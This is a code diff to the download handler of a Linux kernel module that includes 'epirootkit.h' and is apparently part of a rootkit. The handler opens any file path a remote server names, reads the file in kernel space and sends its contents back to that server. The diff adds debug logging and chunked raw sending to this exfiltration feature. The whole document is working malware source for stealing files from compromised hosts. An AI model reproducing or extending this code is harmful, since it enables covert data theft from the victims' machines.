@@ -1,7 +1,7 @@
 #include "download.h"
-
 #include "epirootkit.h"
 #include "io.h"
+#include "network.h"
 
 static bool sending_file = false;
 static char *download_buffer = NULL;
@@ -12,6 +12,7 @@ bool is_downloading(void) {
 }
 
 void reset_download_state(void) {
+    DBG_MSG("reset_download_state: cleaning up memory\n");
     if (download_buffer)
         kfree(download_buffer);
     download_buffer = NULL;
@@ -21,27 +22,30 @@ void reset_download_state(void) {
 
 int download_handler(char *args, enum Protocol protocol) {
     if (protocol != TCP) {
-        DBG_MSG("warning: download will be over TCP.\n");
+        DBG_MSG("download_handler: warning, protocol is not TCP\n");
     }
 
     if (!args || !*args) {
-        send_to_server(TCP, "Usage: download <path>\n");
+        DBG_MSG("download_handler: missing file path argument\n");
+        send_to_server(protocol, "Usage: download <path>\n");
         return -EINVAL;
     }
 
-    DBG_MSG("download_handler: reading file %s\n", args);
-
+    DBG_MSG("download_handler: attempting to open file: %s\n", args);
     struct file *filp = filp_open(args, O_RDONLY, 0);
     if (IS_ERR(filp)) {
-        ERR_MSG("download_handler: failed to open %s\n", args);
+        ERR_MSG("download_handler: failed to open file %s\n", args);
         send_to_server(protocol, "Failed to open file.\n");
         return PTR_ERR(filp);
     }
 
     loff_t pos = 0;
     int size = i_size_read(file_inode(filp));
+    DBG_MSG("download_handler: file size is %d\n", size);
+
     if (size <= 0) {
         filp_close(filp, NULL);
+        DBG_MSG("download_handler: file is empty or unreadable\n");
         send_to_server(protocol, "File is empty or unreadable.\n");
         return -EINVAL;
     }
@@ -49,6 +53,7 @@ int download_handler(char *args, enum Protocol protocol) {
     char *buffer = kmalloc(size, GFP_KERNEL);
     if (!buffer) {
         filp_close(filp, NULL);
+        ERR_MSG("download_handler: memory allocation failed\n");
         send_to_server(protocol, "Insufficient memory.\n");
         return -ENOMEM;
     }
@@ -57,7 +62,7 @@ int download_handler(char *args, enum Protocol protocol) {
     filp_close(filp, NULL);
 
     if (read_bytes != size) {
-        ERR_MSG("download_handler: failed to read file (%d / %d)\n", read_bytes, size);
+        ERR_MSG("download_handler: read error (%d / %d)\n", read_bytes, size);
         kfree(buffer);
         send_to_server(protocol, "Error reading file.\n");
         return -EIO;
@@ -67,20 +72,38 @@ int download_handler(char *args, enum Protocol protocol) {
     download_size = size;
     sending_file = true;
 
+    DBG_MSG("download_handler: file read successfully (%d bytes)\n", size);
+
     char size_msg[64];
     snprintf(size_msg, sizeof(size_msg), "SIZE %ld\n", download_size);
     send_to_server(protocol, size_msg);
 
-    DBG_MSG("download_handler: ready to send %ld bytes after READY\n", download_size);
+    DBG_MSG("download_handler: waiting for READY before sending file\n");
     return 0;
 }
 
 int download(const char *command) {
     if (sending_file && strncmp(command, "READY", 5) == 0) {
-        DBG_MSG("download: sending file (%ld bytes)\n", download_size);
-        send_to_server(TCP, download_buffer);
+        DBG_MSG("download: received READY, starting file transfer (%ld bytes)\n", download_size);
+
+        long sent = 0;
+        while (sent < download_size) {
+            long chunk_size = min_t(long, STD_BUFFER_SIZE - 8, download_size - sent);
+            int chunk = send_to_server_raw(download_buffer + sent, chunk_size);
+            if (chunk <= 0) {
+                ERR_MSG("download: failed to send chunk at offset %ld\n", sent);
+                break;
+            }
+
+            DBG_MSG("download: sent %d bytes (offset %ld)\n", chunk, sent);
+            sent += chunk_size;
+        }
+
+        DBG_MSG("download: transfer complete (%ld / %ld)\n", sent, download_size);
         reset_download_state();
         return 0;
     }
+
+    DBG_MSG("download: command ignored or not in transfer mode\n");
     return -1;
 }
